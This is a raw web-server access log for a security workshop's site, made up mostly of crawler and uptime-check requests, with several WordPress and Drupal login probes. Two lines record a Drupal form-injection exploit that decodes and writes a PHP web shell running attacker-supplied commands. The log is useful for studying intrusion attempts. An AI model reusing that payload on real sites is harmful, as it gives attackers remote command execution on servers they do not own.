www.nspw.org:80 46.229.168.77 - - [30/Apr/2018:21:35:56 -0400] "GET /2006/ HTTP/1.1" 302 502 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 46.229.168.77 - - [30/Apr/2018:21:35:56 -0400] "GET /2006/ HTTP/1.1" 302 502 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 46.229.168.66 - - [30/Apr/2018:21:36:08 -0400] "GET /2016/sponsors HTTP/1.1" 302 518 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 46.229.168.71 - - [30/Apr/2018:21:36:30 -0400] "GET /2011/pc HTTP/1.1" 302 506 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 46.229.168.67 - - [30/Apr/2018:21:36:55 -0400] "GET /2012/dates HTTP/1.1" 302 512 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 46.229.168.71 - - [30/Apr/2018:21:37:22 -0400] "GET /2008/nspw2008-cfp.html HTTP/1.1" 302 536 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 69.162.124.227 - - [30/Apr/2018:21:37:46 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 46.229.168.68 - - [30/Apr/2018:21:37:57 -0400] "GET /2005/cfp/latex/?C=S%3BO%3DA HTTP/1.1" 302 546 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 46.229.168.78 - - [30/Apr/2018:21:38:07 -0400] "GET /2008/broken_past.content HTTP/1.1" 302 540 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 46.229.168.76 - - [30/Apr/2018:21:38:32 -0400] "GET /proceedings/2001 HTTP/1.1" 302 524 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 111.206.59.141 - - [30/Apr/2018:21:38:34 -0400] "GET / HTTP/1.1" 302 473 "http://www.so.com" "Mozilla/5.0 (Windows NT 6.2; rv:30.0) Gecko/20150101 Firefox/32.0 360Spider 360Spider"
www.nspw.org:80 66.249.73.72 - - [30/Apr/2018:21:38:51 -0400] "GET /papers/2000/nspw2000-bruschi.pdf HTTP/1.1" 302 593 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
www.nspw.org:80 46.229.168.68 - - [30/Apr/2018:21:39:08 -0400] "GET /2006 HTTP/1.1" 302 500 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 46.229.168.75 - - [30/Apr/2018:21:39:17 -0400] "GET /2003/hold/cfp.shtml HTTP/1.1" 302 530 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 46.229.168.68 - - [30/Apr/2018:21:39:36 -0400] "GET /2009/nspw-header.html HTTP/1.1" 302 534 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 46.229.168.73 - - [30/Apr/2018:21:40:02 -0400] "GET /2009/proceedings/1994/?C=S%3BO%3DA HTTP/1.1" 302 560 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 46.229.168.68 - - [30/Apr/2018:21:40:24 -0400] "GET /2008/panel.htmlQQ HTTP/1.1" 302 526 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 46.229.168.68 - - [30/Apr/2018:21:40:50 -0400] "GET /papers/?C=S%3BO%3DA HTTP/1.1" 302 530 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 66.249.73.74 - - [30/Apr/2018:21:40:51 -0400] "GET /2009/proceedings/2008/nspw2008-wurster.pdf HTTP/1.1" 302 613 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
www.nspw.org:80 46.229.168.67 - - [30/Apr/2018:21:41:13 -0400] "GET /2003/program.content HTTP/1.1" 302 532 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 46.229.168.69 - - [30/Apr/2018:21:41:38 -0400] "GET /papers/1999?C=M%3BO%3DA HTTP/1.1" 302 538 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 216.244.66.200 - - [30/Apr/2018:21:41:46 -0400] "GET /2010/submissions HTTP/1.1" 302 505 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
www.nspw.org:80 46.229.168.67 - - [30/Apr/2018:21:42:00 -0400] "GET /2015/program HTTP/1.1" 302 516 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 46.229.168.76 - - [30/Apr/2018:21:42:14 -0400] "GET /2003/?C=D%3BO%3DA HTTP/1.1" 302 526 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 69.162.124.227 - - [30/Apr/2018:21:42:46 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 46.229.168.70 - - [30/Apr/2018:21:42:53 -0400] "GET /2013/papers HTTP/1.1" 302 514 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 46.229.168.72 - - [30/Apr/2018:21:43:06 -0400] "GET /2010/local HTTP/1.1" 302 512 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 46.229.168.74 - - [30/Apr/2018:21:43:25 -0400] "GET /2003/cfp.content HTTP/1.1" 302 524 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 181.115.248.33 - - [30/Apr/2018:21:43:49 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 46.229.168.68 - - [30/Apr/2018:21:43:51 -0400] "GET /2005/proceedings.shtml HTTP/1.1" 302 536 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 181.115.248.33 - - [30/Apr/2018:21:43:53 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 46.229.168.74 - - [30/Apr/2018:21:44:01 -0400] "GET /2003/cfp.content HTTP/1.1" 302 524 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 46.229.168.76 - - [30/Apr/2018:21:44:26 -0400] "GET /2011/program HTTP/1.1" 302 516 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 46.229.168.76 - - [30/Apr/2018:21:44:32 -0400] "GET /2011/program HTTP/1.1" 302 516 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 46.229.168.68 - - [30/Apr/2018:21:44:39 -0400] "GET /2009/registration.html HTTP/1.1" 302 536 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 82.226.97.184 - - [30/Apr/2018:21:44:51 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 82.226.97.184 - - [30/Apr/2018:21:44:52 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 46.229.168.77 - - [30/Apr/2018:21:45:01 -0400] "GET /papers/2012/forms/index.htm HTTP/1.1" 302 546 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 46.229.168.68 - - [30/Apr/2018:21:45:29 -0400] "GET /2008/cfp/?C=M%3BO%3DA HTTP/1.1" 302 534 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 40.77.167.128 - - [30/Apr/2018:21:45:38 -0400] "GET /2009/proceedings/1997/nspw1997-moskowitz.pdf HTTP/1.1" 302 617 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
www.nspw.org:80 46.229.168.67 - - [30/Apr/2018:21:45:52 -0400] "GET /papers/2010/?C=D%3BO%3DA HTTP/1.1" 302 540 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 46.229.168.66 - - [30/Apr/2018:21:46:20 -0400] "GET /papers/2012/forms/authors.htm HTTP/1.1" 302 550 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 46.229.168.70 - - [30/Apr/2018:21:46:32 -0400] "GET /2009/proceedings/?C=D%3BO%3DA HTTP/1.1" 302 550 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 46.229.168.70 - - [30/Apr/2018:21:46:49 -0400] "GET /2008/papers.content.2007 HTTP/1.1" 302 540 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 46.229.168.65 - - [30/Apr/2018:21:47:18 -0400] "GET /2010/cfp HTTP/1.1" 302 508 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 35.231.29.226 - - [30/Apr/2018:21:47:29 -0400] "GET /robots.txt HTTP/1.0" 302 512 "-" "ZoominfoBot (zoominfobot at zoominfo dot com)"
www.nspw.org:80 35.231.29.226 - - [30/Apr/2018:21:47:30 -0400] "GET /papers/2012/ HTTP/1.0" 302 516 "-" "ZoominfoBot (zoominfobot at zoominfo dot com)"
www.nspw.org:80 46.229.168.65 - - [30/Apr/2018:21:47:38 -0400] "GET /2002/past.shtml HTTP/1.1" 302 522 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 171.13.14.134 - - [30/Apr/2018:21:47:45 -0400] "GET / HTTP/1.1" 302 529 "http://www.nspw.org/" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; Tablet PC 2.0)"
www.nspw.org:80 69.162.124.227 - - [30/Apr/2018:21:47:45 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 46.229.168.67 - - [30/Apr/2018:21:48:00 -0400] "GET /papers/2005/ HTTP/1.1" 302 516 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 101.199.108.118 - - [30/Apr/2018:21:48:28 -0400] "GET / HTTP/1.1" 302 529 "-" "Mozilla/5.0 (Linux; U; Android 5.0.2; zh-CN; Redmi Note 3 Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 OPR/11.2.3.102637 Mobile Safari/537.36"
www.nspw.org:80 ::1 - - [30/Apr/2018:21:48:32 -0400] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.29 (Ubuntu) OpenSSL/1.1.0g (internal dummy connection)"
www.nspw.org:80 ::1 - - [30/Apr/2018:21:48:33 -0400] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.29 (Ubuntu) OpenSSL/1.1.0g (internal dummy connection)"
www.nspw.org:80 ::1 - - [30/Apr/2018:21:48:34 -0400] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.29 (Ubuntu) OpenSSL/1.1.0g (internal dummy connection)"
www.nspw.org:80 88.230.175.30 - - [30/Apr/2018:21:48:44 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 88.230.175.30 - - [30/Apr/2018:21:48:45 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 46.229.168.73 - - [30/Apr/2018:21:48:45 -0400] "GET /2005/tmp/?C=D%3BO%3DA HTTP/1.1" 302 534 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 66.249.73.72 - - [30/Apr/2018:21:48:51 -0400] "GET /papers/1999/nspw1999-povey.pdf HTTP/1.1" 302 589 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
www.nspw.org:80 66.249.73.76 - - [30/Apr/2018:21:49:04 -0400] "GET /2009/proceedings/1996/nspw1996-rasmusson.pdf HTTP/1.1" 302 617 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
www.nspw.org:80 46.229.168.67 - - [30/Apr/2018:21:49:11 -0400] "GET /2005/pc.shtml HTTP/1.1" 302 518 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 46.229.168.77 - - [30/Apr/2018:21:49:14 -0400] "GET /2008/local.content.2008 HTTP/1.1" 302 538 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 185.232.20.242 - - [30/Apr/2018:21:49:30 -0400] "GET /user/login HTTP/1.1" 302 489 "http://nspw.org/user/login" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3198.0 Safari/537.36 OPR/49.0.2711.0"
www.nspw.org:80 185.232.20.242 - - [30/Apr/2018:21:49:30 -0400] "GET /user/login HTTP/1.1" 302 489 "http://nspw.org/user/login" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3198.0 Safari/537.36 OPR/49.0.2711.0"
www.nspw.org:80 185.232.20.242 - - [30/Apr/2018:21:49:30 -0400] "GET /user/login HTTP/1.1" 302 489 "http://nspw.org/user/login" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3198.0 Safari/537.36 OPR/49.0.2711.0"
www.nspw.org:80 46.229.168.72 - - [30/Apr/2018:21:49:32 -0400] "GET /2003/hold/pc.shtml HTTP/1.1" 302 528 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 46.229.168.79 - - [30/Apr/2018:21:50:09 -0400] "GET /2009/proceedings/2004/?C=S%3BO%3DA HTTP/1.1" 302 560 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 46.229.168.68 - - [30/Apr/2018:21:50:16 -0400] "GET /2005/cfp/ HTTP/1.1" 302 510 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 59.124.153.166 - - [30/Apr/2018:21:50:38 -0400] "POST /?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=echo%20PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9%20%7C%20base64%20-d%20%7C%20tee%20owotg.php HTTP/1.1" 302 980 "-" "curl/7.47.0"
www.nspw.org:80 59.124.153.166 - - [30/Apr/2018:21:50:38 -0400] "POST /?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=echo%20PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9%20%7C%20base64%20-d%20%7C%20tee%20owotg.php HTTP/1.1" 302 980 "-" "curl/7.47.0"
www.nspw.org:80 46.229.168.77 - - [30/Apr/2018:21:50:43 -0400] "GET /2004/oldindex.html HTTP/1.1" 302 528 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 66.249.73.74 - - [30/Apr/2018:21:50:49 -0400] "GET /papers/1993/nspw1993-hammonds.pdf HTTP/1.1" 302 595 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
www.nspw.org:80 203.87.251.216 - - [30/Apr/2018:21:51:00 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 203.87.251.216 - - [30/Apr/2018:21:51:01 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 46.229.168.72 - - [30/Apr/2018:21:51:16 -0400] "GET /2005/index.shtml HTTP/1.1" 302 524 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 46.229.168.76 - - [30/Apr/2018:21:51:19 -0400] "GET /2009/proceedings/1993/?C=M%3BO%3DA HTTP/1.1" 302 560 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 46.229.168.70 - - [30/Apr/2018:21:51:43 -0400] "GET /papers/2010/?C=M%3BO%3DA HTTP/1.1" 302 540 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 46.229.168.66 - - [30/Apr/2018:21:52:10 -0400] "GET /2009/proceedings/2012/forms/authors.htm HTTP/1.1" 302 570 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 66.249.65.117 - - [30/Apr/2018:21:52:18 -0400] "GET /papers/2001/nspw2001-sekar.pdf HTTP/1.1" 302 585 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
www.nspw.org:80 46.229.168.71 - - [30/Apr/2018:21:52:39 -0400] "GET /papers/1999/?C=N%3BO%3DD HTTP/1.1" 302 540 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 69.162.124.227 - - [30/Apr/2018:21:52:45 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 46.229.168.71 - - [30/Apr/2018:21:53:06 -0400] "GET /papers/1996?C=N%3BO%3DD HTTP/1.1" 302 538 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 46.229.168.69 - - [30/Apr/2018:21:53:24 -0400] "GET /2016 HTTP/1.1" 302 500 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 66.249.73.72 - - [30/Apr/2018:21:53:26 -0400] "GET /papers/2003/nspw2003-backes.pdf HTTP/1.1" 302 591 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
www.nspw.org:80 46.229.168.67 - - [30/Apr/2018:21:53:44 -0400] "GET /2005/index.content HTTP/1.1" 302 528 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 46.229.168.80 - - [30/Apr/2018:21:54:00 -0400] "GET /sponsors-2010 HTTP/1.1" 302 518 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 46.229.168.70 - - [30/Apr/2018:21:54:58 -0400] "GET /2009/proceedings/1996/?C=S%3BO%3DA HTTP/1.1" 302 560 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 46.229.168.74 - - [30/Apr/2018:21:55:06 -0400] "GET /2008/cfp/?C=D%3BO%3DA HTTP/1.1" 302 534 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 46.229.168.79 - - [30/Apr/2018:21:55:45 -0400] "GET /papers/2005/?C=N%3BO%3DD HTTP/1.1" 302 540 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 46.229.168.67 - - [30/Apr/2018:21:55:52 -0400] "GET /2004/dates.content HTTP/1.1" 302 528 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 46.229.168.68 - - [30/Apr/2018:21:56:12 -0400] "GET /2008/local.content.2007 HTTP/1.1" 302 538 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 66.249.65.119 - - [30/Apr/2018:21:56:34 -0400] "GET /papers/2011/nspw2011-locasto.pdf HTTP/1.1" 302 589 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
www.nspw.org:80 46.229.168.66 - - [30/Apr/2018:21:56:40 -0400] "GET /papers/1997/?C=S%3BO%3DA HTTP/1.1" 302 540 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 46.229.168.66 - - [30/Apr/2018:21:56:56 -0400] "GET /2005/tmp/ HTTP/1.1" 302 510 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 46.229.168.73 - - [30/Apr/2018:21:57:22 -0400] "GET /2009/proceedings/2012/forms/authors.htm HTTP/1.1" 302 570 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 69.162.124.227 - - [30/Apr/2018:21:57:44 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 46.229.168.66 - - [30/Apr/2018:21:57:49 -0400] "GET /proceedings/2006 HTTP/1.1" 302 524 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 46.229.168.70 - - [30/Apr/2018:21:58:13 -0400] "GET /papers/2012/forms/authors.htm HTTP/1.1" 302 550 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 46.229.168.73 - - [30/Apr/2018:21:58:36 -0400] "GET /2005/cfp/latex/lang.sty HTTP/1.1" 302 538 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 200.30.201.71 - - [30/Apr/2018:21:59:08 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 200.30.201.71 - - [30/Apr/2018:21:59:09 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 46.229.168.79 - - [30/Apr/2018:21:59:15 -0400] "GET /papers/2010/?C=S%3BO%3DA HTTP/1.1" 302 540 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 46.229.168.68 - - [30/Apr/2018:21:59:25 -0400] "GET /2011/organizers HTTP/1.1" 302 522 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 46.229.168.70 - - [30/Apr/2018:21:59:48 -0400] "GET /papers/2005/?C=M%3BO%3DA HTTP/1.1" 302 540 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 54.36.149.30 - - [30/Apr/2018:21:59:51 -0400] "GET /2008/oc.content.qq HTTP/1.1" 302 509 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)"
www.nspw.org:80 66.249.73.74 - - [30/Apr/2018:21:59:55 -0400] "GET /2009/proceedings/1996/nspw1996-orman.pdf HTTP/1.1" 302 609 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
www.nspw.org:80 46.229.168.73 - - [30/Apr/2018:22:00:14 -0400] "GET /2009/proceedings/2012/forms/contents.htm HTTP/1.1" 302 572 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 66.249.73.74 - - [30/Apr/2018:22:00:17 -0400] "GET /papers/2008/nspw2008-molloy.pdf HTTP/1.1" 302 591 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
www.nspw.org:80 92.23.11.138 - - [30/Apr/2018:22:00:19 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 92.23.11.138 - - [30/Apr/2018:22:00:20 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 216.244.66.236 - - [30/Apr/2018:22:00:34 -0400] "GET /robots.txt HTTP/1.1" 302 493 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
www.nspw.org:80 46.229.168.73 - - [30/Apr/2018:22:00:39 -0400] "GET /2018/cfp HTTP/1.1" 302 508 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 162.210.196.130 - - [30/Apr/2018:22:00:55 -0400] "GET /robots.txt HTTP/1.1" 302 549 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
www.nspw.org:80 162.210.196.130 - - [30/Apr/2018:22:01:06 -0400] "GET / HTTP/1.1" 302 473 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
www.nspw.org:80 46.229.168.65 - - [30/Apr/2018:22:01:25 -0400] "GET /2002/oc.shtml HTTP/1.1" 302 518 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 46.229.168.78 - - [30/Apr/2018:22:01:39 -0400] "GET /2006/cfp/?C=S%3BO%3DA HTTP/1.1" 302 534 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 46.229.168.78 - - [30/Apr/2018:22:01:43 -0400] "GET /2006/cfp/?C=S%3BO%3DA HTTP/1.1" 302 534 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 46.229.168.70 - - [30/Apr/2018:22:01:54 -0400] "GET /login?destination=node%2F3 HTTP/1.1" 302 544 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 46.229.168.74 - - [30/Apr/2018:22:02:25 -0400] "GET /2011/organizers HTTP/1.1" 302 522 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 66.249.73.74 - - [30/Apr/2018:22:02:26 -0400] "GET /papers/2009/nspw2009-herley.pdf HTTP/1.1" 302 591 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 77.88.47.3 - - [30/Apr/2018:22:02:27 -0400] "GET /2008/cfp.shtml HTTP/1.1" 302 557 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
www.nspw.org:80 216.244.66.200 - - [30/Apr/2018:22:02:29 -0400] "GET /2006/tmp/?C=S;O=A HTTP/1.1" 302 507 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
